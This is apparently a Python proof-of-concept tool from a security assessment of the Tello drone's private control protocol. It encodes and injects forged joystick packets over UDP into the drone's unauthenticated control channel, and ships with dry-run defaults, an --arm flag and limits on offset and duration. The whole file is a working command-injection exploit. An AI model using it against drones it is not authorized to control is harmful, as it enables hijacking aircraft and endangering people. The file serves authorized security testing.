#!/usr/bin/env python3
"""
Tello App 私有協定的封包編碼器與注入工具（TC-L1-03）。

用途
    F12 已觀測到控制通道明文、序號恆為 0、Wi-Fi 無密碼，
    據此推論可由任意來源注入飛行指令。
    本工具用於把該推論轉為直接證據。

⚠️ 授權與安全
    僅供在自有裝置、自有無人機、且已取得授權的場域使用。
    預設為 dry-run（只印出封包不送出）；任何實際送出都需要明示旗標。
    涉及飛行面的操作另需 --arm，且強制設定持續時間上限。

    使用前請先讀 docs/03-ethics-legal.md。

協定參數（皆由 tools/derive_tello_crc.py 對 16,849 個實測封包驗證）
    CRC8  poly=0x8c  init=0x77   reflect  覆蓋 byte[0:3] → byte[3]
    CRC16 poly=0x8408 init=0x3692 reflect  覆蓋 byte[0:-2] → 末兩位元組(LE)

封包結構
    cc | len<<3 (2,LE) | crc8 | type | cmd (2,LE) | seq (2,LE) | payload | crc16 (2,LE)

搖桿酬載（11 bytes）
    [0:6]  4 個 11-bit 軸值打包，中位 1024，實測範圍 364–1684
    [6]    時   [7] 分   [8] 秒   [9:11] 毫秒 (LE)
"""
import sys, socket, time, struct, argparse, subprocess, shutil

try:
    sys.stdout.reconfigure(encoding="utf-8")
except Exception:
    pass

CENTER, DEFLECT = 1024, 660          # 實測：中位 1024，最大偏移 ±660
DRONE = ("192.168.10.1", 8889)
CMD_STICK = 0x0050


def _tbl8():
    t = []
    for i in range(256):
        c = i
        for _ in range(8):
            c = (c >> 1) ^ (0x8c if c & 1 else 0)
        t.append(c & 0xFF)
    return t


def _tbl16():
    t = []
    for i in range(256):
        c = i
        for _ in range(8):
            c = (c >> 1) ^ (0x8408 if c & 1 else 0)
        t.append(c & 0xFFFF)
    return t


T8, T16 = _tbl8(), _tbl16()


def crc8(d, init=0x77):
    c = init
    for b in d:
        c = T8[(c ^ b) & 0xFF]
    return c & 0xFF


def crc16(d, init=0x3692):
    c = init
    for b in d:
        c = (c >> 8) ^ T16[(c ^ b) & 0xFF]
    return c & 0xFFFF


def encode(cmd, seq, payload, ptype=0x60):
    """組出一個完整封包（含兩組 CRC）。"""
    total = 11 + len(payload)
    hdr = bytes([0xCC]) + struct.pack("<H", total << 3)
    hdr += bytes([crc8(hdr)])
    body = hdr + bytes([ptype]) + struct.pack("<H", cmd) + struct.pack("<H", seq) + payload
    return body + struct.pack("<H", crc16(body))


def stick_payload(a1, a2, a3, a4, hh, mm, ss, ms):
    """4 個軸值 + 時間 → 11 bytes。軸值範圍 0–2047。"""
    v = (a1 & 0x7FF) | ((a2 & 0x7FF) << 11) | ((a3 & 0x7FF) << 22) | ((a4 & 0x7FF) << 33)
    return v.to_bytes(6, "little") + bytes([hh, mm, ss]) + struct.pack("<H", ms)


def decode_stick(pkt):
    pl = pkt[9:-2]
    v = int.from_bytes(pl[0:6], "little")
    return ((v & 0x7FF, (v >> 11) & 0x7FF, (v >> 22) & 0x7FF, (v >> 33) & 0x7FF),
            pl[6], pl[7], pl[8], int.from_bytes(pl[9:11], "little"))


# --------------------------------------------------------------- 自我驗證
def selftest(pcap):
    """
    決定性驗證：把擷取到的每個搖桿封包解碼後重新編碼，
    比對是否與原始位元組完全相同。
    100% 吻合即證明編碼器正確——與欄位語意的命名無關。
    """
    tshark = shutil.which("tshark") or r"C:\Program Files\Wireshark\tshark.exe"
    p = subprocess.run([tshark, "-r", pcap, "-Y", "udp.dstport==8889",
                        "-T", "fields", "-e", "data.data"],
                       capture_output=True, text=True)
    pkts = []
    for l in p.stdout.splitlines():
        l = l.strip().replace(":", "")
        if not l:
            continue
        try:
            b = bytes.fromhex(l)
        except ValueError:
            continue
        if b and b[0] == 0xCC and len(b) >= 11:
            pkts.append(b)

    stick = [x for x in pkts if int.from_bytes(x[5:7], "little") == CMD_STICK]
    print(f"讀入 0xcc 封包 {len(pkts):,}，其中搖桿封包 {len(stick):,}\n")

    ok = bad = 0
    first_bad = None
    for x in stick:
        axes, hh, mm, ss, ms = decode_stick(x)
        rebuilt = encode(CMD_STICK, int.from_bytes(x[7:9], "little"),
                         stick_payload(*axes, hh, mm, ss, ms), ptype=x[4])
        if rebuilt == x:
            ok += 1
        else:
            bad += 1
            if first_bad is None:
                first_bad = (x.hex(), rebuilt.hex())

    print("=== 往返驗證（解碼 → 重新編碼 → 比對原始位元組）===")
    print(f"  完全相同: {ok:,}/{len(stick):,}  ({100*ok/max(len(stick),1):.4f}%)")
    if bad:
        print(f"  不相同  : {bad:,}")
        print(f"    原始: {first_bad[0]}")
        print(f"    重建: {first_bad[1]}")
        return 1
    print("\n  → 編碼器已被實測資料證明正確，可用於構造注入封包。")
    return 0


# --------------------------------------------------------------- 送出
def send(pkts, label, dry, delay=0.02, sock=None):
    print(f"\n[{label}] {len(pkts)} 個封包，間隔 {delay*1000:.0f} ms")
    if dry:
        for i, p in enumerate(pkts[:3], 1):
            print(f"  (dry-run) #{i} {p.hex()}")
        if len(pkts) > 3:
            print(f"  (dry-run) …其餘 {len(pkts)-3} 個未列出")
        print("  ⚠ dry-run：未送出任何封包。加 --send 才會實際發送。")
        return
    s = sock or socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0.5)
    for p in pkts:
        s.sendto(p, DRONE)
        time.sleep(delay)
    print(f"  已送出 {len(pkts)} 個封包至 {DRONE[0]}:{DRONE[1]}")


def main():
    ap = argparse.ArgumentParser(description="Tello 私有協定編碼器與注入工具")
    ap.add_argument("--selftest", metavar="PCAP", help="以擷取檔驗證編碼器正確性")
    ap.add_argument("--neutral", action="store_true",
                    help="送出中位搖桿封包（不含任何偏移，理論上不產生動作）")
    ap.add_argument("--axis", type=int, choices=[1, 2, 3, 4],
                    help="對指定軸施加偏移（需 --arm）")
    ap.add_argument("--offset", type=int, default=80,
                    help="偏移量，預設 80（滿舵為 660），建議由小開始")
    ap.add_argument("--seconds", type=float, default=1.0, help="持續秒數，上限 3")
    ap.add_argument("--send", action="store_true", help="實際送出（否則僅 dry-run）")
    ap.add_argument("--arm", action="store_true",
                    help="允許送出帶偏移的封包。未加此旗標時僅允許中位值")
    args = ap.parse_args()

    if args.selftest:
        return selftest(args.selftest)

    dry = not args.send
    dur = min(args.seconds, 3.0)
    n = max(1, int(dur / 0.02))
    t = time.localtime()

    if args.axis:
        if not args.arm:
            print("拒絕執行：帶偏移的封包需要 --arm。")
            print("請先以 --neutral 確認飛機是否接受本工具構造的封包。")
            return 1
        if abs(args.offset) > 200:
            print(f"拒絕執行：offset={args.offset} 過大。首次實測請保持在 200 以內。")
            return 1
        axes = [CENTER] * 4
        axes[args.axis - 1] = CENTER + args.offset
        label = f"軸 {args.axis} 偏移 {args.offset:+d}"
    elif args.neutral:
        axes = [CENTER] * 4
        label = "中位（無偏移）"
    else:
        ap.print_help()
        return 0

    pkts = []
    for i in range(n):
        ms = (t.tm_sec * 1000 + int(i * 20)) % 1000
        pkts.append(encode(CMD_STICK, 0,
                           stick_payload(*axes, t.tm_hour, t.tm_min, t.tm_sec, ms)))
    send(pkts, label, dry)
    return 0


if __name__ == "__main__":
    sys.exit(main())
